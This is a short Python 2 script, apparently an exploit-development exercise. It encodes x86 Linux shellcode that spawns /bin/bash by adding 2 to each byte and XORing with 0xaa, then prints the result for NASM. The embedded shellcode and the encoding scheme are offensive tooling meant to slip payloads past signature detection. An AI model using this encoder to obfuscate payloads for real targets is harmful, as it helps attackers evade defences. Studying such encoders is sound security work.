#!/usr/bin/python

# Two Staged Python Encoder
# The purpose of this python script is to take shellcode, modify it by adding 2 to each byte, then xor'ing the results
# author: Ian McLachlan

import os

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")





original 	= ""
original2 	= ""
part1a 		= ""   	
part1b 		= ""	
part2a 		= ""	
part2b 		= ""
carryf		= ""

os.system('clear')

print '**********************************************'
print '* Mod the shellcode by adding 2 then xor-ing *'
print '**********************************************\r\n'
#stage 1

for x in bytearray(shellcode) :	

	original += '\\x'
	original += '%02x' %x
	
	y = x + 2
	carryf += '%02x' %y
	part1a += '\\x'
	part1a += '%02x' %y

	part1b += '0x'
	part1b += '%02x,' %y


print 'STAGE1 +2 @ byte\r\n'
print '*****************************************'
print 'Original       				', original
print 'Add 2 encoder  				', part1a
print 'Nasm format    				', part1b
print 'Length of shellcode: 		 	%d\r\n\r\n' % len(bytearray(shellcode))

#stage 2

fcount =(len(bytearray.fromhex(carryf)))
for b in bytearray.fromhex(carryf) :    

	original2 += '\\x'
	original2 += '%02x' %b

	c = b^0xaa
	part2a += '\\x'
	part2a += '%02x' %c

	part2b += '0x'
	part2b += '%02x,' %c


print 'STAGE2 xor stage1 result\r\n'
print '*****************************************'
print 'Original with the +2  			', original2
print 'then xor    				', part2a
print 'Nasm format 				', part2b
print 'Length of shellcode: 			%d\r\n\r\n' % len(bytearray(fcount))
